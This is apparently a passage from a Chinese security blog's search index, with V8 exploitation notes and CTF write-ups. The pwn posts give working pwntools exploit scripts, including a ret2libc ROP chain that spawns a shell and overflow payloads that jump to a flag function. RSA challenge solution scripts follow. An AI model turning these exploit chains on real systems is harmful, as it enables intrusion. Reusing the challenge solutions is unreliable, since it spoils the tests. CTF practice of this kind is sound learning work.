尚未优化","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"V8简介","slug":"V8简介","date":"2019-12-16T06:31:58.000Z","updated":"2019-12-16T06:33:24.987Z","comments":true,"path":"2019/12/16/V8简介/","link":"","permalink":"https://darkwing.moe/2019/12/16/V8%E7%AE%80%E4%BB%8B/","excerpt":"","text":"什么是V8解释，执行Javascript代码的引擎 自身是C++实现 解析Javascript 代码，构造AST(抽象语法树) 基于AST，通过JIT编译器将其转换为汇编，执行 AST 抽象语法树大概是这样(以a+b为例)： V8也可以单独运行，一般是和其他项目一起被使用，例如Google Chrome，Node.js等 ##V8 Exploit之前 首先，我们需要了解V8的构造 并不需要全部了解（V8的代码更新很快） 但了解基本的概念是必须的 从Exploit角度深入了解 创建任意地址读写原语是否容易？ 是否能够早稳定的Exploit 这份PPT中主要讲解2016年4月的v8的结构，如果想了解现在的v8，可以参考这些资料： https://www.slideshare.net/ssuser6f246f/v8-javascript-engine-for https://speakerdeck.com/brn/source-to-binary-journey-of-v8-javascript-engine V8的编译器和优化编译器的种类V8最重要的组件就是编译器 内部大体上是这4种编译器： 旧的baseline编译器：Full-Codegen 旧的优化编译器：Crankshaft 新的优化编译器：TurboFan 新的baseline编译器：Ignition 下面这些资料可以用于参考： An overview of the TurboFan compiler TurboFan: A new code generation architecture for V8 编译器的历史V8内部编译器的变迁： 最初，Full-Codegen直接生成和执行机器语言 从AST生成机器代码(JIT)比较快,但生成的机器代码有很多冗余，有待进一步优化 2010年，针对hot-code优化目的，引入了Crankshaft 调用频率较高，机器代码生成时间还能再减少，判断可以更优化的代码 2015年，因为Crankshaft适配JavaScript的新规范比较麻烦，引入了新的TurboFan 2017年，为了维护效率，引入了用于生成中间代码的Ignition TurboFan专门优化中间代码 2018年至今，Full-Codegen和Crankshaft结束寿命，被删除 回到例题例题是2016年当时的latest 存在Full-Codegen，Crankshaft，TurboFan Hidden Class + Inline Caching也被用于优化 编译器与优化 Baseline编译器 Full-Codegen （对于这次例题exp的重要程度低） 优化机制 Hidden Class （更准确的说，Hidden Class是为自身加速的机制，而Inline Caching是以Hidden Class的信息为基础，进行优化的机制） Inline Caching 优化编译器 Crankshaft TurboFan 各种编译器在V8源码的src目录中： 其他应该知道的：","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"V8环境","slug":"V8环境","date":"2019-12-09T05:31:12.000Z","updated":"2019-12-09T05:39:22.492Z","comments":true,"path":"2019/12/09/V8环境/","link":"","permalink":"https://darkwing.moe/2019/12/09/V8%E7%8E%AF%E5%A2%83/","excerpt":"","text":"网络墙国几个坑，常规代理方式(直接export 酸酸乳那种)不行 gclient内部跑download_from_google_storage时，是用不了socks的，只能用http代理，于是需要下载polipo，用它将socks转换为一个http代理， 12345678910111213141516171819$ cat /etc/polipo/config # This file only needs to list configuration variables that deviate# from the default values. See /usr/share/doc/polipo/examples/config.sample# and \"polipo -v\" for variables you can tweak and further information.logSyslog = truelogFile = /var/log/polipo/polipo.logproxyAddress = \"0.0.0.0\" socksParentProxy = \"10.211.55.2:1086\"socksProxyType = socks5 chunkHighMark = 50331648objectHighMark = 16384 serverMaxSlots = 64serverSlots = 16serverSlots1 = 32 然后重启服务修改终端代理为polipo 123sudo service polipo restartexport http_proxy=\"http://127.0.0.1:8123\"export https_proxy=\"https://127.0.0.1:8123\" 另外gclient内部好像用的boto吧，需要配置boto来采用此HTTP代理，于是需要： 在$HOME/.boto文件中写入: 123[Boto] proxy = 127.0.0.1proxy_port = 8123 export NO_AUTH_BOTO_CONFIG=$HOME/.boto 再次执行gclient sync 环境搭建这个就直接看傻哭啦博客，用的也是binja小哥的PPT v8 exploit | Sakuraのbloghttp://eternalsakura13.com/2018/05/06/v8/ 现在直接用ninja方式吧，如果已经make方式失败的话，需要重新fetch v8之后再用ninja方式 JS相关问题关于JavaScript引擎主流浏览器，渲染引擎，JS引擎 其他实现也很多，参考 https://blog.sessionstack.com/how-javascript-works-inside-the-v8-engine-5-tips-on-how-to-write-optimized-code-ac089e62b12e 两种常见模式模式一：脆弱的补丁，给出补丁信息，根据补丁分析攻击方法，使用JavaScript构造exp 模式二：过去的CVE问题，给出旧版本源码编译生成的二进制文件，前后的commit，某些情况也会给出PoC，通过这些信息使用JavaScript构造exp 攻略方法两种模式攻略流程大致如下： 特定版本的JS调试环境 如果提供了patch，build patch 分析patch，确定patch用于哪个进程 V8的话，Full-Codegen，Crankshaft，TurboFan，Ignition，AST，IC，… Full-Codegen和Crankshaft在2018坠吼的V8中已经不存在（之后会详细说） 创建利用此漏洞的Javascript代码片段 该代码会经过patch后的部分，造成bug 创建任意地址读写的原语 通常使用ArrayBuffer和TypedArray getshell 通常使用在JIT区域嵌入shellcode的方式 为什么要自己build 便于与正常二进制文件做比较 release的二进制文件已经打了补丁 设置断点会比较麻烦 内联函数用的比较多，难以找到函数地址 可以通过函数名设置断点，但函数名也难以找到 为了指定特定函数，需要解析所有命名空间后整理 但是，有许多匿名命名空间的函数 自己build的printf() 或者__asm__(&quot;int3&quot;) 速度更快 浮点数计算用的寄存器(xmm之类的)，用到的很频繁 使用gdb进行调试或者dump会很麻烦 另外，release的二进制文件一半没有调试符号，因此最好自己build TargetPPT中用的例子 Plaid CTF 2016 - Pwnable 666pts - js_sandbox V8的Pwn题，使用JavaScript来getshell，接近real world 当时的v8，已经和现在大不相同： 当时: Full-Codegen(JIT生成) + Crankshaft(优化1) + TurboFan(优化2) 现在: Ignition(JIT生成) + TurboFan(优化） 题目考查点存在于TurboFan中 必要知识 编译器优化相关知识 各种编译器之间的关系，编译器优化的触发条件 GC(垃圾回收)相关知识 GC的实现，触发条件 V8的内存结构和类型表现相关知识 整数，double，指针，字符串，特殊值，数组，ArrayBuffer 等 参考用的Writeup： https://gist.github.com/sroettger/d077d3907999aaa0f89d11d956b438ea https://rzhou.org/~ricky/pctf2016/js_sandbox.js","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"ciscn_2019_c_1","slug":"ciscn-2019-c-1","date":"2019-11-26T08:51:02.000Z","updated":"2019-11-26T08:52:02.314Z","comments":true,"path":"2019/11/26/ciscn-2019-c-1/","link":"","permalink":"https://darkwing.moe/2019/11/26/ciscn-2019-c-1/","excerpt":"","text":"题目信息64位elf，开了NX 分析大概就是这样一个加解密程序，读取输入选择功能，encrypt读取用户输入，decrypt不可用 可以看出encrypt读取输入明显的溢出： 题目没有system和sh所以需要构造ROP。并且没有给出libc文件，但存在puts函数，可以用于leak。 所以就是leak出函数地址，确定libc，之后构造ROP exploitencrypt64位，puts函数一个参数，需要rdi寄存器的gadget，并且需要返回到开始位置： 另外因为输入会经过encrypt，异或处理，所以二次异或会还原，即输入的payload要先经过一次处理： 123456789101112def dd(enc): res = '' for i in range(len(enc)): if ord(enc[i]) &lt;= 96 or ord(enc[i]) &gt; 122: if ord(enc[i]) &lt;= 64 or ord(enc[i]) &gt; 90: if ord(enc[i]) &gt; 47 or ord(enc[i]) &lt;= 57: res += chr(ord(enc[i]) ^ 0xf) else: res += chr(ord(enc[i]) ^ 0xe) else: res += chr(ord(enc[i]) ^ 0xd) return res 然后gdb对pattern处理可以算出偏移为88: 不过实际打的时候不需要处理 几个坑exp很简单的，但有几个坑 leak那里用puts不用gets，原因是gets匹配出的结果太多了 然后，现在线上环境是18版本，直接拿网上流传的那些打的话会失败，因为那些是针对16版本的 如果gdb attach跟一下的话，会发现是正常走到了system步骤，但之后会报这样一个错误： 直接根据报错信息，能够搜到这篇文章： 在一些64位的glibc的payload调用system函数失败问题 – Ex个人博客http://blog.eonew.cn/archives/958 自己跟进去的话，能够看到确实是栈没对齐，那很简单，多加个ret对齐，再找个ret的gadget就可以： exploit123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *from LibcSearcher import *sh = process('./ciscn_2019_c_1')# sh = remote('node3.buuoj.cn', 28271)elf = ELF('./ciscn_2019_c_1')# context.log_level = 'debug'# start = 0x400B28start = elf.sym['main']rdi_addr = 0x0000000000400c83puts_plt = elf.plt['puts']gets_got = elf.got['gets']puts_got = elf.got['puts']log.success('puts_plt =&gt; &#123;&#125;'.format(hex(puts_plt)))log.success('gets_got =&gt; &#123;&#125;'.format(hex(gets_got)))log.success('puts_got =&gt; &#123;&#125;'.format(hex(puts_got)))sh.sendlineafter('choice!\\n', '1')payload1 = 'a' * 88payload1 += p64(rdi_addr) + p64(puts_got) + p64(puts_plt)payload1 += p64(start)# payload1 = dd(payload1)sh.sendline(payload1)gdb.attach(sh)sh.recvuntil('@')sh.recvline()puts_leak = u64(sh.recvline()[:-1].ljust(8, '\\0'))log.success('puts_leak_addr =&gt; &#123;&#125;'.format(hex(puts_leak)))libc = LibcSearcher('puts', puts_leak)libc_base = puts_leak - libc.dump('puts')sys_addr = libc_base + libc.dump('system')bin_sh_addr = libc_base + libc.dump('str_bin_sh')log.success('libc_base_addr =&gt; &#123;&#125;'.format(hex(libc_base)))log.success('system_addr =&gt; &#123;&#125;'.format(hex(sys_addr)))log.success('bin_sh_addr =&gt; &#123;&#125;'.format(hex(bin_sh_addr)))sh.sendlineafter('choice!\\n', '1')payload2 = 'a' * 88payload2 += p64(0x4006b9) # add retpayload2 += p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)sh.sendline(payload2)sh.interactive()","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"pwn1_sctf_2016","slug":"pwn1-sctf-2016","date":"2019-11-13T07:42:00.000Z","updated":"2019-11-13T07:43:33.682Z","comments":true,"path":"2019/11/13/pwn1-sctf-2016/","link":"","permalink":"https://darkwing.moe/2019/11/13/pwn1-sctf-2016/","excerpt":"","text":"题目信息32位elf，开了NX 文件是C++的，需要安装下依赖 1sudo apt-get install lib32stdc++6 分析 存在vuln函数及get_flag函数 所以重点看vuln函数 fgets是读取输入，存在长度限制，但会把用户输入的I替换为you，这样三倍的长度就能够造成溢出： offset可以测试出来是21*3+1，即64 exploit12345678910111213from pwn import *# sh = process('./pwn1_sctf_2016')sh = remote('node3.buuoj.cn',28495)elf = ELF('./pwn1_sctf_2016')get_flag = elf.symbols['get_flag']log.success('get_flag_addr =&gt; &#123;&#125;'.format(hex(get_flag)))payload = 'I' * 21 + 'A' + p32(get_flag)sh.sendline(payload)print(sh.recv())","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"warmup_csaw_2016","slug":"warmup-csaw-2016","date":"2019-11-10T02:32:32.000Z","updated":"2019-11-10T02:33:23.099Z","comments":true,"path":"2019/11/10/warmup-csaw-2016/","link":"","permalink":"https://darkwing.moe/2019/11/10/warmup-csaw-2016/","excerpt":"","text":"题目信息基本信息64位elf，保护没开 静态分析IDA中可以看到，输出一个函数地址，然后gets，gets可能溢出 这个函数就是直接cat flag的函数 那么意图很明显，就是溢出后控制执行这个函数get flag 动态分析gdb中计算出offset为72: exploit12345678910111213#!/usr/bin/pythonfrom pwn import *sh = remote('node3.buuoj.cn', 28839)# context.log_level = 'debug'sh.recvuntil('WOW:')addr = sh.recvuntil('\\n')[:-1]# payload = 'A' * 72 + p64(int(addr, 16))payload = 'A' * 72 + p64(0x40060d)print payloadsh.writeline(payload)sh.interactive()","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"CTF中RSA类题目","slug":"CTF中RSA类题目","date":"2019-11-06T08:25:03.000Z","updated":"2019-11-06T08:25:41.738Z","comments":true,"path":"2019/11/06/CTF中RSA类题目/","link":"","permalink":"https://darkwing.moe/2019/11/06/CTF%E4%B8%ADRSA%E7%B1%BB%E9%A2%98%E7%9B%AE/","excerpt":"","text":"已知p,q,e,求d 在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17求解出d作为flag提交 1234567891011121314from Crypto.PublicKey import RSAimport sysp = 473398607161q = 4511491e = 17n = (p - 1) * (q - 1)i = 0# 17x + ny = 1while True: if ((1 - n * i) % e == 0): break; i -= 1print '%d' % ((1 - n * i) / e) 已知p,q,e,c,求m Math is cool! Use the RSA algorithm to decode the secret message, c, p, q, and e are parameters for the RSA algorithm. p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034 Use RSA to find the secret message 12345678910import gmpy2p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034s = (p - 1) * (q - 1)d = long(gmpy2.invert(e, s))n = p * qprint pow(c, d, n) 已知p,q,dp,dq,c,求m p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852 其中关系式如下: dp=d%(p-1) dq=d%(q-1) 12345678910111213141516171819import gmpy2import binasciidef decrypt(dp, dq, p, q, c): InvQ = gmpy2.invert(q, p) mp = pow(c, dp, p) mq = pow(c, dq, q) m = (((mp - mq) * InvQ) % p) * q + mq print (binascii.unhexlify(hex(m)[2:]))p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852decrypt(dp, dq, p, q, c) 已知c1,e1,c2,e2,n,求m c1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361n=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801e1=11187289c2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2=9647291 这种属于 共模攻击， 识别：若干次加密，e不同，n相同，m相同。就可以在不分解n和求d的前提下，解出明文m。 1234567891011121314151617181920212223242526272829303132333435363738import syssys.setrecursionlimit(10000000)c1 = 22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361n = 22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801e1 = 11187289c2 = 18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397e2 = 9647291def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % ms = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1 &lt; 0: s1 = - s1 c1 = modinv(c1, n)elif s2 &lt; 0: s2 = - s2 c2 = modinv(c2, n)m = (pow(c1, s1, n) * pow(c2, s2, n)) % nprint '&#123;:x&#125;'.format(m).decode('hex') 已知e,n,dp,c, 求m e = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657 c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751 详细公式推导，来源： https://www.jianshu.com/p/74270dc7a14b 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364公式推导现在我们可以知道的是c≡me mod nm≡cd mod nϕ(n)&#x3D;(p−1)∗(q−1)d∗e≡1 mod ϕ(n)dp≡d mod (p−1)c≡me mod nm≡cd mod nϕ(n)&#x3D;(p−1)∗(q−1)d∗e≡1 mod ϕ(n)dp≡d mod (p−1)由式5*e可以得到dp∗e≡d∗e mod (p−1)dp∗e≡d∗e mod (p−1)因此可以得到d∗e&#x3D;k∗(p−1)+dp∗ed∗e≡1 mod ϕ(n)d∗e&#x3D;k∗(p−1)+dp∗ed∗e≡1 mod ϕ(n)我们将式1带入式2可以得到k∗(p−1)+dp∗e≡1 mod (p−1)∗(q−1)k∗(p−1)+dp∗e≡1 mod (p−1)∗(q−1)故此可以得到k2∗(p−1)∗(q−1)+1&#x3D;k1∗(p−1)+dp∗ek2∗(p−1)∗(q−1)+1&#x3D;k1∗(p−1)+dp∗e变换一下(p−1)∗[k2∗(q−1)−k1]+1&#x3D;dp∗e(p−1)∗[k2∗(q−1)−k1]+1&#x3D;dp∗e因为dp&lt;p−1dp可以得到e&gt;k2∗(q−1)−k1e&gt;k2∗(q−1)−k1我们假设x&#x3D;k2∗(q−1)−k1x&#x3D;k2∗(q−1)−k1可以得到x的范围为(0,e)(0,e)因此有x∗(p−1)+1&#x3D;dp∗ex∗(p−1)+1&#x3D;dp∗e那么我们可以遍历x∈(0,e)x∈(0,e)求出p-1，求的方法也很简单，遍历65537种可能，其中肯定有一个p可以被n整除那么求出p和q，即可利用ϕ(n)&#x3D;(p−1)∗(q−1)d∗e≡1 mod ϕ(n)ϕ(n)&#x3D;(p−1)∗(q−1)d∗e≡1 mod ϕ(n)推出d≡1∗e−1 mod ϕ(n)d≡1∗e−1 mod ϕ(n)注：这里的-1为逆元，不是倒数的那个-1作者：合天智汇链接：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;74270dc7a14b来源：简书著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 1234567891011121314151617181920#!/usr/bin/python# coding:utf-8import gmpy2import libnumfrom Crypto.Util.number import long_to_bytese = 65537n = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113dp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657c = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751for i in range(1, 65538): if (dp * e - 1) % i == 0: if n % (((dp * e - 1) / i) + 1) == 0: p = ((dp * e - 1) / i) + 1 q = n / (((dp * e - 1) / i) + 1) phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) % phi m = pow(c, d, n) print long_to_bytes(m) 给出公钥文件及加密文件，解密这种首先需要使用openssl 读取公钥文件pubkey.pem 12345678910111213openssl rsa -pubin -in pub.key -text -modulusPublic-Key: (256 bit)Modulus: 00:c0:33:2c:5c:64:ae:47:18:2f:6c:1c:87:6d:42: 33:69:10:54:5a:58:f7:ee:fe:fc:0b:ca:af:5a:f3: 41:cc:ddExponent: 65537 (0x10001)Modulus=C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDDwriting RSA key-----BEGIN PUBLIC KEY-----MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMAzLFxkrkcYL2wch21CM2kQVFpY9+7+/AvKr1rzQczdAgMBAAE=-----END PUBLIC KEY----- 其中Modulus为n，将其转为10进制后分解出p和q，在线分解：http://factordb.com/ 123n = 86934482296048119190666062003494800588905656017203025617216654058378322103517p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463 现在有了n,p,q,e,c，所以可以根据p,q求phi，再根据phi和e求d，接着根据c，d，n即可求出明文m。 12345678910111213141516171819from Crypto.PublicKey import RSAimport sysimport libnumfrom Crypto.Util.number import long_to_bytesimport gmpy2n = 86934482296048119190666062003494800588905656017203025617216654058378322103517p = 285960468890451637935629440372639283459q = 304008741604601924494328155975272418463e = 65537phi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)with open('/Users/miao/Downloads/0eaf8d6c-3fe5-4549-9e81-94ac42535e7b/flag.enc') as f: c = f.read().encode('hex') c = int(c, 16)m = pow(c, d, n)print mprint long_to_bytes(m) e特别大，wiener attack N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471 e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085 import hashlib flag = “flag{“ + hashlib.md5(hex(d)).hexdigest() + “}” https://github.com/pablocelayes/rsa-wiener-attack 1234N = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471e = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085hacked_d = hack_RSA(e, N)print(\"d =\", hacked_d) Roll按行加密 {920139713,19} 70479679275221115227470416418414022368270835483295235263072905459788476483295235459788476663551792475206804459788476428313374475206804459788476425392137704796792458265677341524652483295235534149509425392137428313374425392137341524652458265677263072905483295235828509797341524652425392137475206804428313374483295235475206804459788476306220148 1234567891011121314151617#!/usr/bin/python# coding:utf-8import gmpy2from Crypto.Util.number import long_to_bytesn = 920139713p = 49891q = 18443e = 19phi = (p - 1) * (q - 1)d = gmpy2.invert(e, phi)m = \"\"with open('RSA_Roll.txt', 'r') as f: for c in f.readlines(): m += long_to_bytes(pow(int(c), d, n))print m 给出e及很多组n和c，求m m = xxxxxxxxe = 65537========== n c ==========n = 20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207c = 974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320 n = 20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759c = 15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855 n = 25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491c = 4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862 n = 21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751c = 4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613 n = 22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067c = 